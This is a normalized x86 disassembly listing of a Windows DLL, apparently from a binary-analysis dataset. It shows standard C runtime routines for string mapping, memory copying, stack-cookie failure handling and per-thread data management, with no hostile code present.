call sub_10011c31
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10011c31
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10011c31
push [ esi + 0xc0 ]
call sub_10011c31
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10016c6f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10011c31
pop ecx
sub_10016c8f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_1001f5be
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1001f607
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10011c31
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_10011c31
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10016c6f
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1001338e
pop ecx
cmp eax ebx
je r-xdata
call sub_1001f7c0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_10011a90
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1001f607
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1001338e
pop ecx
cmp eax ebx
je r-xdata
call sub_1001f7c0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10016c6f
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10016c6f
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1001338e
pop ecx
cmp eax ebx
je r-xdata
call sub_1001f7c0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10017034
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10016c8f
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10017080
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10017108 ]
jmp [ ecx * 4 + jump_table_10017188 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171f4 ]
pop esi
pop edi
pop ebp
jmp sub_1001f873
jmp [ ecx * 4 + jump_table_10017390 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10017294 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017390 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100171f4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10017390 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171f4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017390 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017390 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017390 ]
sub_100173e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_1001743c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001747a
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1001794d
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1001794d
pop ecx
sub_10017580
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10017608 ]
jmp [ ecx * 4 + jump_table_10017688 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100176f4 ]
pop esi
pop edi
pop ebp
jmp sub_1001f873
jmp [ ecx * 4 + jump_table_10017890 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10017794 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017890 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100176f4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10017890 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100176f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100176f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100176f4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017890 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017890 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10017890 ]
sub_100178e5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10017955
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10013ab8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_100179d0
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10013ab8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_10017a4b
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_100179d0
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10017a7f
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_1001a359
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_10017abc
push 0xc
push r--data
call sub_10018984
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_10013ab8
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017b91
push 0xc
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_100146dc
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017b9a
call sub_100189c9
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10017ba3
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10017a4b
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_100166ee
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_10011c31
pop ecx
xor esi esi
push 0x0
push esi
call sub_10017abc
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10017c36
push 0x8
push r--data
call sub_10018984
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100189c9
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10011c31
pop ecx
push 0xd
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10011c31
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017d50
push 0xc
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
